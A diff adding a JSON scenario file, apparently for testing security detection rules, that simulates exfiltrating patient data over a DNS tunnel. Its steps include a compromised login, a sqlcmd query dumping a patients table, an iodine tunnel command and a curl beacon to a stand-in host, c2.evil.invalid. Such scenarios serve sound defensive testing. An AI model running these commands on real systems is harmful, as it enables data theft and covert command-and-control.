@@ -1,0 +1,41 @@
+{
+  "id": "data-exfiltration-001",
+  "name": "Data Exfiltration via DNS Tunneling",
+  "description": "Simulates sensitive data exfiltration using DNS tunneling to a C2 server.",
+  "mitre_phases": ["Collection", "Exfiltration", "Command and Control"],
+  "expected_rules": [
+    "crucible-sensitive-access",
+    "crucible-dns-tunnel",
+    "crucible-c2-beacon"
+  ],
+  "steps": [
+    {
+      "action": "valid_login",
+      "technique_id": "T1078",
+      "description": "Attacker authenticates with compromised credentials.",
+      "path": "/login",
+      "payload": {"username": "dbadmin", "password": "Admin@2024"}
+    },
+    {
+      "action": "access_sensitive_data",
+      "technique_id": "T1005",
+      "description": "Attacker accesses sensitive database records.",
+      "path": "/admin/simulate-command",
+      "payload": {"username": "dbadmin", "command": "sqlcmd -S localhost -Q 'SELECT * FROM patients'"}
+    },
+    {
+      "action": "dns_tunnel",
+      "technique_id": "T1048.003",
+      "description": "Attacker exfiltrates data via DNS tunneling.",
+      "path": "/admin/simulate-command",
+      "payload": {"username": "dbadmin", "command": "iodine -f -P password c2.evil.invalid data.evil.invalid"}
+    },
+    {
+      "action": "c2_beacon",
+      "technique_id": "T1071.004",
+      "description": "Implant beacons to C2 server for further instructions.",
+      "path": "/admin/simulate-command",
+      "payload": {"username": "dbadmin", "command": "curl -s http://c2.evil.invalid/beacon?id=victim01&interval=30"}
+    }
+  ]
+}
